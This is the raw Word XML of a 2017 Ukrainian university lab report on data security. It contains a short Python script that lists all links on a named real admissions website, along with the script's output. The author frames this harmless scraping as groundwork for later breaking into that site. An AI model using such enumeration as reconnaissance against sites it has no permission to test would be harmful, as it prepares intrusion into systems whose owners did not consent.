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A3F82" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Міністерство освіти і науки України</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34235C08" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Національний технічний університет України „КПІ”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8E77D9" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Факультет інформатики та обчислювальної техніки</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33988A9D" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E0A6726" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70240CE5" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Кафедра автоматизованих систем обробки</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320FA334" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>інформації та управління</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF4DF07" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="791CE0E9" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>ЗВІТ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63ED54E3" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22DE6740" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>до лаборатор</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">ної </w:t>
      </w:r>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>роботи “</w:t>
      </w:r>
      <w:r w:rsidR="00A26380">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Безпека даних</w:t>
      </w:r>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492BD379" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="3600" w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315C9EE7" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>з дисципліни “Основи клієнтської розробки”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4948C482" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07A778BC" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ECF7F0B" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39498C0F" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="558EE4BA" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65E9A622" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00DC2A10" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F975C23" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:u w:val="single" w:color="000000"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="9747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0147DF" w14:paraId="6AC0337B" w14:textId="77777777" w:rsidTr="00F83325">
        <w:trPr>
          <w:trHeight w:val="633"/>
          <w:jc w:val="right"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2484" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="7CB6993B" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:ind w:firstLine="0"/>
              <w:jc w:val="left"/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Викон</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman CYR" w:eastAsia="Times New Roman CYR" w:hAnsi="Times New Roman CYR" w:cs="Times New Roman CYR"/>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="uk-UA"/>
              </w:rPr>
              <w:t>ав</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04216991" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325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студент</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="408" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="10DBA058" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325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54A2FA14" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325">
            <w:pPr>
              <w:spacing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ІП-61 Кушка Михайло Олександрович</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="371" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="0B60AE41" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325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1709B70D" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="000147DF" w:rsidRPr="00256BD0" w14:paraId="66D8BBDB" w14:textId="77777777" w:rsidTr="00F83325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6A83D3A4" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="408" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="5E5B323D" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325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6BA32B12" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325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060333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(№ групи</w:t>
            </w:r>
            <w:r w:rsidRPr="00060333">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:lang w:val="ru-RU"/>
              </w:rPr>
              <w:t>, прізвище, ім’я, по батькові )</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="371" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="6DB8345E" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325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4EBDEA77" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="ru-RU"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="000147DF" w:rsidRPr="00256BD0" w14:paraId="58E1093E" w14:textId="77777777" w:rsidTr="00F83325">
        <w:trPr>
          <w:trHeight w:val="308"/>
          <w:jc w:val="right"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2484" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="23ABBE97" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="ru-RU"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="408" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="0EBB6E44" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="ru-RU"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4630" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="4781DE26" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="ru-RU"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="371" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="5C344187" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="ru-RU"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1854" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="5BC2BD32" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="ru-RU"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="000147DF" w14:paraId="5F0C8255" w14:textId="77777777" w:rsidTr="00F83325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4C2C86CF" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325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Прийняв</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="408" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="633C93A1" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325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25F87EED" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00DC2A10" w:rsidRDefault="000147DF" w:rsidP="00F83325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i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Ковтунець О. В.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="371" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="492A121A" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325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6E055EA3" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="000147DF" w:rsidRPr="00256BD0" w14:paraId="36EF1DCB" w14:textId="77777777" w:rsidTr="00F83325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7DF0DF1A" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="408" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="1CABDBB0" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="00F83325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0817B081" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325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060333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(посада</w:t>
            </w:r>
            <w:r w:rsidRPr="00060333">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:lang w:val="ru-RU"/>
              </w:rPr>
              <w:t>, прізвище, ім’я, по батькові )</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="371" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w14:paraId="0FDAF5DF" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325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5E17178B" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="00F83325">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="ru-RU"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0E56B69D" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:u w:val="single" w:color="000000"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FA84B8D" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00060333" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:u w:val="single" w:color="000000"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="666721A2" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D8233A6" w14:textId="77777777" w:rsidR="000147DF" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27041B15" w14:textId="77777777" w:rsidR="000147DF" w:rsidRPr="00C84945" w:rsidRDefault="000147DF" w:rsidP="000147DF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00060333">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Київ 2017</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638FBBCF" w14:textId="7B3793C6" w:rsidR="003F3122" w:rsidRDefault="00C51CD9" w:rsidP="00C51CD9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Web Scrapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51521883" w14:textId="3E58EEB9" w:rsidR="00C51CD9" w:rsidRDefault="0018436E" w:rsidP="00C51CD9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Спосіб, що полягає у зборі відкритої інформації у вигляді, зручному для подальшого аналізу. В даному прикладі був написаний скрипт на </w:t>
      </w:r>
      <w:r>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="0018436E">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>для отримання адрес усіх сторінок сайту, що може бути використано для подальшого злому сайту.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C727A4" w14:textId="77777777" w:rsidR="0018436E" w:rsidRDefault="0018436E" w:rsidP="0018436E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74CB07B2" w14:textId="2BF3255C" w:rsidR="0018436E" w:rsidRDefault="0018436E" w:rsidP="0018436E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Код скрипту</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BDD5B8" w14:textId="5471ADEA" w:rsidR="0018436E" w:rsidRPr="00AE0849" w:rsidRDefault="0018436E" w:rsidP="0018436E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AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>from bs4 import BeautifulSoup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0682C56E" w14:textId="2829D096" w:rsidR="0018436E" w:rsidRPr="00AE0849" w:rsidRDefault="0018436E" w:rsidP="0018436E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AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>import requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8D11D2" w14:textId="6733D784" w:rsidR="0018436E" w:rsidRPr="00AE0849" w:rsidRDefault="0018436E" w:rsidP="0018436E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AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url = "http://vstup.info/web"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD12B3E" w14:textId="4ADFD8AA" w:rsidR="0018436E" w:rsidRPr="00AE0849" w:rsidRDefault="0018436E" w:rsidP="0018436E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AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>r  = requests.get(url)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D0068E" w14:textId="0887D950" w:rsidR="0018436E" w:rsidRPr="00AE0849" w:rsidRDefault="0018436E" w:rsidP="0018436E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AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>data = r.text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A6C6AB" w14:textId="5EA88696" w:rsidR="0018436E" w:rsidRPr="00AE0849" w:rsidRDefault="0018436E" w:rsidP="0018436E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AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>soup = BeautifulSoup(data, "html5lib")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A206CD5" w14:textId="77777777" w:rsidR="0018436E" w:rsidRPr="00AE0849" w:rsidRDefault="0018436E" w:rsidP="0018436E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AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>for link in soup.find_all('a'):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414876C6" w14:textId="02400F00" w:rsidR="0018436E" w:rsidRPr="00AE0849" w:rsidRDefault="0018436E" w:rsidP="0018436E">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>print(link.get('href'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A4AB1B" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0849">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1844DF09" w14:textId="252D26E6" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0849">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r w:rsidRPr="00AE0849">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>роботи</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A49FC8" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./Web-Tech-Client-Labs.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3392A1DC" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./Web-Tech-Server-Labs.pdf</w:t>
      </w:r>
